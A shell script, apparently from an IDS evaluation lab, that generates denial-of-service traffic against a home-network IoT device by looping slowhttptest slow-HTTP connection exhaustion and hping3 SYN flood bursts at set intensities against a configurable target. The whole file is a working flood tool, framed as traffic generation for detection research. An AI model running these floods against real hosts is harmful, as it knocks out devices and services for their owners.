#!/bin/sh
# IoT DoS simulation — generates a denial-of-service traffic signature against a
# home-network device for IDS (TON-IoT) evaluation in the closed lab.
echo "[IOT-DOS] Starting..."
TARGET="${TARGET_HOST:-172.20.0.10}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
END=$(($(date +%s) + DURATION))

# Intensity -> concurrent connections / flood packets / pause between bursts
case "$INTENSITY" in
    low)    CONN=200;  FLOOD=500;   SLEEP_MAX=6 ;;
    high)   CONN=1500; FLOOD=5000;  SLEEP_MAX=2 ;;
    *)      CONN=800;  FLOOD=2000;  SLEEP_MAX=4 ;;  # medium
esac

while [ $(date +%s) -lt $END ]; do
    # Slow-HTTP style resource exhaustion against the device web interface
    slowhttptest -c $CONN -H \
        -o /tmp/iot_dos_output \
        -i 10 -r 200 -t GET \
        -u "http://$TARGET/" \
        -x 24 -p 3 -l 30 2>/dev/null
    # Short SYN flood burst to amplify the DoS signature
    hping3 -S -p 80 -i u1000 -c $FLOOD $TARGET 2>/dev/null
    sleep $((RANDOM % SLEEP_MAX + 1))
done
echo "[IOT-DOS] Done."
